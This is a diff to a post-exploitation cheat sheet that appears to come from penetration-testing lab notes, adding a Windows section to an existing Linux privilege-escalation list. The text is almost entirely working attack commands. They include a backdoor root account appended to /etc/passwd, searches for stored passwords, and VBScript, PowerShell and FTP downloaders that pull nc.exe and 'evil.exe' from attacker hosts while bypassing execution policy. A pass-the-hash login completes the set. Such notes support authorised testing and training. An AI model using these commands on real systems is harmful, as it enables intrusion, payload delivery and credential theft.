@@ -1,6 +1,7 @@
 
-
+=======================================
 ============== LINUX ==================
+=======================================
 credits: g0tm1lk
 
 #distribution type
@@ -41,3 +42,195 @@ find /* -user root -perm -4000 -print 2>/dev/null
 openssl passwd hacker
 echo "root2:LtuWaoOfuLwps:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+=======================================
+============= WINDOWS =================
+=======================================
+
+#Determine Service Pack
+systeminfo
+	OS Version: 6.1.760 N/A Build 7600
+	OS Version: 6.1.760 Service Pack 1 Build 7600
+	Hotfix(s):	N/A
+
+
+For windows xp Windows XP:
+	type C:\Windows/system32\eula.txt
+	type C:\Windows\System32\license.rtf
+
+#Users on the system
+net user
+
+#Current priviledges
+whoami /priv
+
+#Check user password policy
+net accounts
+
+#SEARCH FOR file contents
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*
+
+#SEARCH FOR certain filenames 
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+where /R C:\ user.txt
+where /R C:\ *.ini
+
+#SEARCH FOR passwords in unattend.xml
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+
+#find what process are running
+tasklist /v
+net start
+sc query
+Get-Service
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+
+#find what process is running as System
+tasklist /v /fi "username eq system"
+
+
+########################
+#### CODE COMPILING ####
+########################
+
+Compiling for linux
+gcc 643.c -o 643
+
+Installing ming
+apt-get install mingw-w64
+
+Compiling using mingw  
+i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe
+
+Compiling fail with error "error while loading shared libraries: requires glibc 2.5 or later dynamic linker"
+gcc -m32 -Wl,--hash-style=both exploit.c -o exploit
+
+
+########################
+### FILE TRANSFERING ###
+########################
+
+#Python file transfer
+c:\python26\python.exe -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.69/nc.exe', 'C:\\Inetpub\\wwwroot\\nc.exe')"
+
+#Apache Webserver 
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+mv /root/Desktop/Test.exe /var/www/html/share
+service apache2 start
+
+
+#VISUAL BASIC - windows downloader
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+Download paylod
+cscript wget.vbs http://10.11.0.5/37.exe evil.exe
+
+#### POWERSHELL - windows downloader pt.1
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+### POWERSHELL - windows downloader pt.2
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+#Compress file nc.exe ie. from 60kb to about 30k
+upx -9 nc.exe
+
+#Convert exe to text in linux
+wine exe2bat.exe nc.exe nc.txt
+
+#Non interactive FTP file transfer
+echo open 10.11.0.131 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo password>> ftp.txt
+echo bin>> ftp.txt
+echo GET nc.exe>> ftp.txt
+echo bye>> ftp.txt
+ftp -v -n -s:ftp.txt
+
+
+#Setting up TFTP
+Note: by default if you cat/etc/defaults/aftpd, the tftp serving directory is set to /srv/tftp
+1. Place your nc.exe into this folder /srv/tftp
+cp /usr/share/windows-binaries/nc.exe /srv/tftp
+2. start your atftp server
+atftpd --daemon --port 69 /tftp
+3. restart aftpd service
+/etc/init.d/atftpd restartcd 
+
+#Setting up pure ftpd
+#!/bin/bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd offsec -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+
+#changing ftpd password
+/etc/init.d/pure-ftpd restart
+pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd
+pure-pw mkdb
+/etc/init.d/pure-ftpd restart
+
+
+#########################
+### STEALING PASSWORD ###
+#########################
+
+#Pass the hash windows
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:B74242F37E4731239A9DWKD09W9KD
+pth-winexe -U administrator% //10.11.1.49 cmd
+
+#using mimikatz
